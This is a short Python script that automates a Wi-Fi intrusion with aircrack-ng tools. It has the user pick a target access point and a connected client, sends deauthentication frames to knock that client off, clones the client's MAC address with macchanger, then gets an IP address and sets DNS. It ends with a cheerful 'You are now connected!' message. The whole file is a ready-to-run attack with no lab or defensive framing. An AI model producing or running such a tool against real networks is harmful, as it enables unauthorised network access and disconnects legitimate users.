import os
import time
def scan_wifi():
    print("\n[STEP 1] Scanning for available Wi-Fi networks...\n")
    os.system("airodump-ng wlan0mon --output-format csv -w scan_results")
    time.sleep(5)

def select_target():
    print("\n[STEP 2] Choose the target Wi-Fi network (BSSID)")
    target_bssid = input("Enter the target BSSID (MAC Address of AP): ")
    target_channel = input("Enter the target Channel: ")
    return target_bssid, target_channel

def scan_clients(target_bssid, target_channel):
    print(f"\n[STEP 3] Scanning for clients connected to {target_bssid}...\n")
    os.system(f"airodump-ng --bssid {target_bssid} -c {target_channel} --output-format csv -w clients")
    time.sleep(5)

def select_client():
    print("\n[STEP 4] Choose the target client to disconnect (MAC Address of the device)")
    client_mac = input("Enter the target Client MAC Address: ")
    return client_mac

def deauth_client(target_bssid, client_mac):
    print(f"\n[STEP 5] Sending deauthentication attack to {client_mac}...\n")
    os.system(f"aireplay-ng --deauth 10 -a {target_bssid} -c {client_mac} wlan0mon")
    time.sleep(5)

def spoof_mac(client_mac):
    print(f"\n[STEP 6] Spoofing MAC address to {client_mac}...\n")
    os.system("ifconfig wlan0 down")
    os.system(f"macchanger -m {client_mac} wlan0")
    os.system("ifconfig wlan0 up")
    print("[✔] MAC Address successfully changed!")

def enable_managed_mode():
    print("\n[STEP 7] Switching wlan0 to Managed Mode...\n")
    os.system("airmon-ng stop wlan0mon")
    os.system("ifconfig wlan0 down")
    os.system("iwconfig wlan0 mode managed")
    os.system("ifconfig wlan0 up")
    print("[✔] wlan0 is now in Managed Mode!")

def get_ip():
    print("\n[STEP 8] Requesting an IP address from the router...\n")
    os.system("dhclient wlan0")
    print("[✔] IP Address assigned!")

def fix_dns():
    print("\n[STEP 9] Fixing DNS issues (if any)...\n")
    os.system('echo "nameserver 8.8.8.8" | sudo tee /etc/resolv.conf')
    print("[✔] DNS fixed!")

def main():
    os.system("airmon-ng start wlan0")  # Start monitor mode

    scan_wifi()  # Scan for networks
    target_bssid, target_channel = select_target()  # User selects AP

    scan_clients(target_bssid, target_channel)  # Scan for connected clients
    client_mac = select_client()  # User selects a client

    deauth_client(target_bssid, client_mac)  # Deauth target client
    spoof_mac(client_mac)  # Spoof MAC address

    enable_managed_mode()  # Switch back to Managed Mode
    get_ip()  
    fix_dns()  
    print("\n🎉🎉 [FINAL STEP] You are now connected! Try opening YouTube 😉 🎉🎉")

if __name__ == "__main__":
    main()
